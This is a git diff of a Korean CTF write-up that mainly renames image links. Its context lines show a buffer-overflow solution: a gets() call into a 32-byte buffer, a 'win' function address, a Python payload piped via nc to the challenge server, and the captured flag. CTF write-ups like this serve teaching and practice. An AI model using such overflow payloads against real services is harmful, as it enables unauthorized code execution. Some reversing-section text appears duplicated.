@@ -31,11 +31,11 @@ CTF에 나가서 문제를 푼적은 꽤 많았지만 writeup를 글로 남기�
 
 IDA로 열고 구조 확인
 
-![Untitled](free-fall/Untitled%201.png)
+![Untitled](free-fall/Untitled-1.png)
 
 이걸로 get에 의한 buffer overflow 문제라는게 확실해짐
 
-![Untitled](free-fall/Untitled%202.png)
+![Untitled](free-fall/Untitled-2.png)
 
 또한 프로그램 string 데이터 중에 `cat flag.txt` 가 존재하는 것을 확인
 
@@ -45,7 +45,7 @@ IDA로 열고 구조 확인
 
 `info functios` 으로 모든 함수 검색
 
-![Untitled](free-fall/Untitled%203.png)
+![Untitled](free-fall/Untitled-3.png)
 
 main 함수 위의 win 이라는 함수가 수상함
 
@@ -53,11 +53,11 @@ main 함수 위의 win 이라는 함수가 수상함
 
 `disassemble win` 으로 함수 디스어셈블
 
-![Untitled](free-fall/Untitled%204.png)
+![Untitled](free-fall/Untitled-4.png)
 
 시작 주소 확보 (이때 x64 기반인것을 알 수 있다)
 
-![Untitled](free-fall/Untitled%205.png)
+![Untitled](free-fall/Untitled-5.png)
 
 char format[32]; 로 선언된 변수에 gets() 함수를 호출하는 것을 확인
 
@@ -69,7 +69,7 @@ char format[32]; 로 선언된 변수에 gets() 함수를 호출하는 것을 �
 python -c "print('A' * 40 + '\x72\x11\x40\x00\x00\x00\x00\x00')" | nc freefall.chall.winja.site 18967
 ```
 
-![Untitled](free-fall/Untitled%206.png)
+![Untitled](free-fall/Untitled-6.png)
 
 `flag{7fbec6d149f9878499b4acd05e06c692_Did_B4BY_MaK3_YOu_OVeRCrY}`
 
@@ -166,7 +166,7 @@ int __fastcall sub_1159(const char *a1)
 
 if문의 숫자들을 적어보면 다음과 같음
 
-![이래서 알아낸건 안비밀](revagers/Untitled%201.png)
+![이래서 알아낸건 안비밀](revagers/Untitled-1.png)
 
 이래서 알아낸건 안비밀
 
@@ -189,7 +189,7 @@ output :
 
 풀이 끗!!
 
-![Untitled](revagers/Untitled%202.png)
+![Untitled](revagers/Untitled-2.png)
 
 Brrrrrrrr 이 나다 :)파일 다운 후 메모장으로 열어 파일 시그니처 확인
 
@@ -274,7 +274,7 @@ int __fastcall sub_1159(const char *a1)
 
 if문의 숫자들을 적어보면 다음과 같음
 
-![이래서 알아낸건 안비밀](revagers/Untitled%201.png)
+![이래서 알아낸건 안비밀](revagers/Untitled-1.png)
 
 이래서 알아낸건 안비밀
 
@@ -292,7 +292,7 @@ output :
 
 풀이 끗!!
 
-![Untitled](revagers/Untitled%202.png)
+![Untitled](revagers/Untitled-2.png)
 
 ## 3. [Steganography] 100점 - T'kani
 
@@ -322,7 +322,7 @@ minion 이란 파일 확보
 
 word/document.xml 파일 속 플래그 발견
 
-![Untitled](tkani/Untitled%201.png)
+![Untitled](tkani/Untitled-1.png)
 
 제출하면 정답 처리
 
